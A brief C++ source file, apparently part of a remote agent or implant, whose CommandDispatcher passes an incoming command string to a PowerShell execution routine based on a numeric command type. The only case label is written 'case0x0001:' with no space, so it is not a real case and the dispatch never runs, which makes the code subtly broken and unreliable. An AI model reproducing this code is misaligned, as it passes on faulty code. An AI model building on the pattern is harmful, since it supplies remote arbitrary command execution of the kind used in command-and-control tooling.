// ========================================== { START OF FILE } ========================================== //
#include "Agent.h"
#include "CommandDispatcher.h"

CommandDispatcher::CommandDispatcher(Agent &agent) : agent(agent) {}

std::string CommandDispatcher::Dispatch(int commandType, const std::string& command)
{
    switch (commandType)
    {
    case0x0001:
        return agent.ExecutePowerShell(command);

    default:
        return std::string();
    }
}
    // ========================================== { END OF FILE } ========================================== //